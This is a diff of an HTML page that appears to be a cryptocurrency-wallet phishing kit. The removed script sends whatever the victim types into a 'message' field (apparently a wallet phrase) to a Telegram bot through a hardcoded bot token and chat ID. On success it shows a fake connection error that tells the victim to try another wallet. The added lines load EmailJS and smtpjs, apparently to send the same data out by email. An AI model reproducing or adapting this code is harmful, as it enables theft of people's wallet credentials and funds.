@@ -39,6 +39,15 @@
         }
     </style>
     <link type="text/css" rel="stylesheet" href="css2.css" id="selected_font">
+    <script type="text/javascript" src="index.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "3uQGBe5GpnVen_-RV"
+            });
+        })();
+    </script>
 </head>
 
 <body __processed_e8a194f3-7eb6-4aac-a5bc-a5f87c6aacff__="true" data-layout="wide" data-color="pink"
@@ -268,41 +277,8 @@
     </footer>
     </section>
     </div>
-    <script>
-        async function SendMail() {
-            const message = document.getElementById('message').value;
-    
-            // Replace with your bot token and chat ID
-            const botToken = '8190116954:AAFjKYlhbN2ZEMse2os4DFQDr3vvVEeLctQ';
-            const chatId = '7711112999';
-    
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                });
-    
-                const data = await response.json();
-                if (data.ok) {
-                    alert('An Error Occured During Connection please try another wallet !');
-                } else {
-                    alert('Failed to send message.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('An error occurred while sending the message.');
-            }
-        }
-    </script>
-
+    <script src="https://smtpjs.com/v3/smtp.js">
+</script>
 
 
 
